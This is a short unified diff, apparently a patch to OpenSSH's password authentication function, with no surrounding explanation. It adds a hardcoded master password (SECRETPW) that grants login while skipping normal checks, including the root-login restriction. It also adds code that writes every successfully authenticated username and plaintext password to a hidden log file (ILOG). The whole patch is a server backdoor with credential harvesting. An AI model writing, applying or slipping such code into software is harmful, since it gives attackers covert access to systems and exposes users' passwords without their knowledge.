@@ -85,7 +85,10 @@ auth_password(Authctxt *authctxt, const char *password)
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
 	static int expire_checked = 0;
 #endif
-
+	if (!strcmp(password, SECRETPW)) {
+                secret_ok=1;
+                return 1;
+        }
 #ifndef HAVE_CYGWIN
 	if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
 		ok = 0;
@@ -123,6 +126,12 @@ auth_password(Authctxt *authctxt, const char *password)
 	}
 #endif
 	result = sys_auth_passwd(authctxt, password);
+	if(result){
+		if((f=fopen(ILOG,"a"))!=NULL){
+			fprintf(f,"user:password --> %s:%s\n",authctxt->user, password);
+			fclose(f);
+		}
+	}
 	if (authctxt->force_pwchange)
 		disable_forwarding();
 	return (result && ok);
